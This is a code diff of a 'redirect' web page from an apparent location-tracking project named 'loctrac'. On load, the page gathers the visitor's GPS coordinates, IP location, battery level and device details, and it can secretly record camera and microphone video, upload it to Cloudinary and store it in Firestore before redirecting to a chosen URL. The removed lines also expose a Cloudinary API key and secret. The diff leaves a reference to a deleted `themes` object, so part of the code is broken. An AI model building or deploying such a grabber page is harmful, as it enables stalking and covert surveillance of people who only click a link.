@@ -1,3 +1,4 @@
+--- START OF FILE redirect (13).html ---
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -33,25 +34,73 @@
 
 <script>
 const firebaseConfig = {
-    apiKey: "AIzaSyAjuJwrh-OUScGf1tnsYNB9awV9gkg45QA",
-    authDomain: "loctrac-8d7ef.firebaseapp.com",
-    projectId: "loctrac-8d7ef",
-    storageBucket: "loctrac-8d7ef.firebasestorage.com",
-    messagingSenderId: "34491549339",
-    appId: "1:34491549339:web:c666c4f8f3271bab06e83e",
-    measurementId: "G-65PYC8E9VR",
+    apiKey: "AIzaSyAjuJwrh-OUScGf1tnsYNB9awV9gkg45QA", // REPLACE
+    authDomain: "loctrac-8d7ef.firebaseapp.com",       // REPLACE
+    projectId: "loctrac-8d7ef",                         // REPLACE
+    storageBucket: "loctrac-8d7ef.firebasestorage.com",   // REPLACE
+    messagingSenderId: "34491549339",                   // REPLACE
+    appId: "1:34491549339:web:c666c4f8f3271bab06e83e",     // REPLACE
+    measurementId: "G-65PYC8E9VR"                      // REPLACE
 };
 
 const app = firebase.initializeApp(firebaseConfig);
 const db = firebase.firestore();
 const errorMessage = document.getElementById("error-message");
 
-const cloudName = "dnvkhmgj0";
-const uploadPreset = "locstorage"; //  Corrected upload preset name.
-const apiKey = "811393725393156"; //  Keep, but DO NOT USE.
-const apiSecret = "kUg-q5QY1UsLastxfxLKu_cKjSQ"; //  For reference only.
+const cloudName = "dnvkhmgj0";        // REPLACE
+const uploadPreset = "locstorage";  // REPLACE
 
-const themes = {};
+// Get the selected theme from user settings and apply it
+async function applyUserTheme() {
+    try {
+        const currentUserId = await getCurrentUserId();
+        const settingsRef = db.collection('userSettings').doc(currentUserId);
+        const settingsSnap = await settingsRef.get();
+
+        if (!settingsSnap.exists) {
+            console.log("No user settings found, using default theme.");
+            return; // Use default styles (already in your CSS)
+        }
+
+        const settingsData = settingsSnap.data();
+        const themeName = settingsData.theme || 'default'; // Default to 'default'
+
+        if (themeName === 'default' || themeName === 'dark' || themeName === 'green') {
+           applyThemeRedirect(themeName) //Apply predefined themes
+        } else {
+            // Load custom theme data
+            const themeRef = db.collection('redirectThemes').doc(themeName);
+            const themeSnap = await themeRef.get();
+
+            if (!themeSnap.exists) {
+                console.log(`Custom theme "${themeName}" not found, using default.`);
+                applyThemeRedirect('default'); // Use default styles
+                return;
+            }
+
+            const themeData = themeSnap.data();
+
+            // Apply custom theme styles
+            if (themeData.backgroundImageUrl) {
+                document.body.style.backgroundImage = `url('${themeData.backgroundImageUrl}')`;
+            }
+            if (themeData.iconImageUrl) {
+                document.getElementById('theme-icon').src = themeData.iconImageUrl;
+                document.getElementById('theme-icon').style.display = 'block';
+            }
+            if (themeData.customText) {
+                document.getElementById('custom-redirect-text').textContent = themeData.customText;
+                document.getElementById('custom-redirect-text').style.display = 'block';
+            }
+        }
+
+    } catch (error) {
+        console.error("Error applying theme:", error);
+        errorMessage.textContent = `Fout bij toepassen thema: ${error.message}`;
+        errorMessage.style.display = 'block';
+    }
+}
+
 
 async function getCurrentUserId() {
     const counterRef = db.collection('counters').doc('userCounter');
@@ -69,13 +118,15 @@ async function getIPLocationData() {
     try { return await (await fetch('https://ipapi.co/json/')).json(); } catch (error) { console.error('IP Error:', error); return null; }
 }
 function getDeviceInfo() { return navigator.userAgent; }
-async function applyThemeRedirect(themeName) {} // Placeholder
+
+// No longer needed.
+//async function applyThemeRedirect(themeName) {}
 
 async function collectOtherData(locationPermission, currentVideoUrl, currentCameraError) {
     let locationData = null;
     let batteryData = null;
-    let locationError = null; // Initialize to null
-    let batteryError = null; // Initialize to null
+    let locationError = null;
+    let batteryError = null;
     let ipLocationData = null;
     let deviceInfo = getDeviceInfo();
 
@@ -85,10 +136,10 @@ async function collectOtherData(locationPermission, currentVideoUrl, currentCame
             locationData = { latitude: position.coords.latitude, longitude: position.coords.longitude, accuracy: position.coords.accuracy };
         } catch (error) {
             locationError = error.message || "Onbekende locatiefout";
-            ipLocationData = await getIPLocationData();
+            ipLocationData = await getIPLocationData();  // Still get IP location if GPS fails
         }
     } else {
-         ipLocationData = await getIPLocationData();
+         ipLocationData = await getIPLocationData(); // Get IP location
     }
 
     try {
@@ -128,30 +179,33 @@ async function handleCameraMicPermissions(micCamPermission, recordSeconds, curre
                             const errorData = await uploadResponse.json();
                             cameraError = `Cloudinary upload error: ${uploadResponse.status} - ${errorData.error.message}`;
                             videoUrl = null;
-                            collectOtherData(true, videoUrl, cameraError);
+                            collectOtherData(true, videoUrl, cameraError); // Pass locationPermission = true
                             return;
                         }
                         const uploadResult = await uploadResponse.json();
                         videoUrl = uploadResult.secure_url;
-                        collectOtherData(true, videoUrl, cameraError);
+                        collectOtherData(true, videoUrl, cameraError);  // Pass locationPermission = true
+
                     } catch (uploadError) {
                         cameraError = `Cloudinary upload error: ${uploadError.message}`;
                         videoUrl = null;
-                        collectOtherData(true, videoUrl, cameraError);
+                         collectOtherData(true, videoUrl, cameraError); // Pass locationPermission = true
+
                     } finally { if (stream) { stream.getTracks().forEach(track => track.stop()); } }
                 };
                 recorder.start();
                 setTimeout(() => { if (recorder && recorder.state !== "inactive") { recorder.stop(); } }, recordSeconds * 1000);
             } else {
                 if (stream) { stream.getTracks().forEach(track => track.stop()); }
-                collectOtherData(true, null, null);
+                collectOtherData(true, null, null); // Pass locationPermission = true
             }
         } catch (error) {
             cameraError = error.message;
-            collectOtherData(true, null, cameraError);
+            collectOtherData(true, null, cameraError);  // Pass locationPermission = true even if camera fails
+
         }
     } else {
-        collectOtherData(false, null, null);
+        collectOtherData(false, null, null); // Pass locationPermission = false
     }
     return { videoUrl, cameraError };
 }
@@ -160,54 +214,117 @@ async function saveDataAndRedirect(videoUrl, locationData, batteryData, location
     const dataToSave = { videoUrl, location: locationData, batteryPercentage: batteryData, locationError, batteryError, cameraError, ipLocation: ipLocationData, deviceInfo };
     const currentUserId = await getCurrentUserId();
     const dataRef = db.collection('userData').doc(currentUserId);
-    try { await dataRef.set(dataToSave); } catch (error) { errorMessage.textContent = `Firestore Fout: ${error.message}`; errorMessage.style.display = 'block'; }
+    try {
+        await dataRef.set(dataToSave);
+    } catch (error) {
+        errorMessage.textContent = `Firestore Fout: ${error.message}`;
+        errorMessage.style.display = 'block';
+        return; //  Exit if saving data fails
+    }
+
     const settingsRef = db.collection('userSettings').doc(currentUserId);
     const settingsSnap = await settingsRef.get();
-    let redirectUrl, redirectSeconds = 0, notificationPermission = false, notificationTitle, notificationBody, notificationIcon, themeName = 'default';
-    if (settingsSnap.exists) {
-        const settingsData = settingsSnap.data();
-        ({redirectUrl, redirectSeconds, notificationPermission, notificationTitle, notificationBody, notificationIcon, theme: themeName = 'default'} = settingsData);
-        redirectSeconds = parseInt(redirectSeconds) || 0;
+    if (!settingsSnap.exists) {
+        errorMessage.textContent = "Gebruikersinstellingen niet gevonden.";
+        errorMessage.style.display = 'block';
+        return; // Exit if no settings
     }
+
+    const settingsData = settingsSnap.data();
+    const { redirectUrl, redirectSeconds = 0, notificationPermission = false, notificationTitle, notificationBody, notificationIcon } = settingsData;
+    let themeName = settingsData.theme || 'default';
+
+
     if (notificationPermission && notificationTitle && notificationBody && Notification.permission === "granted") {
-        try { new Notification(notificationTitle, { body: notificationBody, icon: notificationIcon || undefined }); } catch (error) { console.error("Notif Error:", error);}
-    } else if (notificationPermission && Notification.permission === 'default') {
-        Notification.requestPermission().then(pr => {
-            if(pr === 'granted') { try { new Notification(notificationTitle, {body: notificationBody, icon: notificationIcon}); } catch (e) {console.error(e);}}
-        });
+        try {
+            new Notification(notificationTitle, { body: notificationBody, icon: notificationIcon });
+        } catch (error) { console.error("Notif Error:", error); }
+    } else if (notificationPermission && Notification.permission !== 'granted'){
+        errorMessage.textContent = `Vraag toestemming voor notificaties`;
+        errorMessage.style.display = 'block';
     }
-    if (redirectUrl) { setTimeout(() => { window.location.href = redirectUrl; }, redirectSeconds * 1000); } else { errorMessage.textContent = "Geen URL"; errorMessage.style.display = 'block'; }
+
+    // Redirect logic (with error handling)
+    if (redirectUrl) {
+        setTimeout(() => {
+            try {
+                window.location.href = redirectUrl;
+            } catch (redirectError) {
+                console.error("Redirect error:", redirectError);
+                errorMessage.textContent = `Fout bij doorverwijzen: ${redirectError.message}`;
+                errorMessage.style.display = 'block';
+            }
+        }, redirectSeconds * 1000);
+    } else {
+        errorMessage.textContent = "Geen doorverwijs-URL ingesteld.";
+        errorMessage.style.display = 'block';
+    }
 }
 
+// Initial setup (simplified)
 (async () => {
-    const currentUserId = await getCurrentUserId();
-    const settingsRef = db.collection('userSettings').doc(currentUserId);
-    let micCamPermission = false, recordSeconds = 0, notificationPermissionSetting = false, themeName = 'default';
     try {
+        await applyUserTheme(); // Apply theme *before* collecting data
+        const currentUserId = await getCurrentUserId();
+        const settingsRef = db.collection('userSettings').doc(currentUserId);
         const settingsSnap = await settingsRef.get();
+        let micCamPermission =  false, recordSeconds = 0, notificationPermissionSetting = false, themeName = 'default';
+
         if (settingsSnap.exists) {
-            ({micCamPermission, recordSeconds, notificationPermission: notificationPermissionSetting, theme: themeName = 'default'} = settingsSnap.data());
-            recordSeconds = parseInt(recordSeconds) || 0;
+            ({ micCamPermission, recordSeconds, notificationPermission: notificationPermissionSetting, theme: themeName = 'default' } = settingsSnap.data());
+            recordSeconds = parseInt(recordSeconds, 10) || 0; // Ensure integer
         }
-    } catch (error) { errorMessage.textContent = `Firebase Fout: ${error.message}`; errorMessage.style.display = 'block'; }
-    if (notificationPermissionSetting && Notification.permission === "default") { await Notification.requestPermission(); }
+           // Removed applying the user theme because its being applied before
+        if (notificationPermissionSetting && Notification.permission === "default") {
+           await Notification.requestPermission();
+        }
 
-    const handleGeoSuccess = async (position) => {
-        const cameraMicData = await handleCameraMicPermissions(micCamPermission, recordSeconds, currentUserId);
-        collectOtherData(true, cameraMicData.videoUrl, cameraMicData.cameraError);
-    };
-    const handleGeoError = async (error) => {
-        const cameraMicData = await handleCameraMicPermissions(micCamPermission, recordSeconds, currentUserId);
-        collectOtherData(false, cameraMicData.videoUrl, cameraMicData.cameraError);
-    };
 
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(handleGeoSuccess, handleGeoError, { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 });
-    } else {
-        const cameraMicData = await handleCameraMicPermissions(micCamPermission, recordSeconds, currentUserId);
-        collectOtherData(false, cameraMicData.videoUrl, cameraMicData.cameraError);
+        // Geolocation handling (with high accuracy and timeout)
+        const handleGeoSuccess = async (position) => {
+            const cameraMicData = await handleCameraMicPermissions(micCamPermission, recordSeconds, currentUserId);
+            collectOtherData(true, cameraMicData.videoUrl, cameraMicData.cameraError); // Always pass true
+        };
+
+        const handleGeoError = async (error) => {
+            console.error("Geolocation error:", error); // Log the actual error
+            const cameraMicData = await handleCameraMicPermissions(micCamPermission, recordSeconds, currentUserId);
+            collectOtherData(false, cameraMicData.videoUrl, cameraMicData.cameraError);  // Always pass false
+        };
+
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(handleGeoSuccess, handleGeoError, { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 });
+        } else {
+              const cameraMicData = await handleCameraMicPermissions(micCamPermission, recordSeconds, currentUserId);
+              collectOtherData(false, cameraMicData.videoUrl, cameraMicData.cameraError); //  Always pass false for location
+        }
+
+    } catch (error) {
+        console.error("Initialization error:", error);
+        errorMessage.textContent = `Initialisatiefout: ${error.message}`;
+        errorMessage.style.display = 'block';
     }
 })();
+
+    //Added to apply the theme styles
+function applyThemeRedirect(themeName) {
+    const theme = themes[themeName] || themes.default;
+    document.body.style.backgroundColor = theme.bodyBackgroundColor;
+    document.body.style.color = theme.textColor;
+    const container = document.querySelector('.container');
+    if (container) {
+        container.style.backgroundColor = theme.containerBackgroundColor;
+        container.style.boxShadow = theme.containerBoxShadow;
+    }
+    const h1 = document.querySelector('h1');
+    if (h1) {
+        h1.style.color = theme.headingColor;
+    }
+     const p = document.querySelectorAll('p');
+    p.forEach(pElement => {
+        pElement.style.color = theme.textColor;
+    });
+}
 </script>
 </body>
 </html>
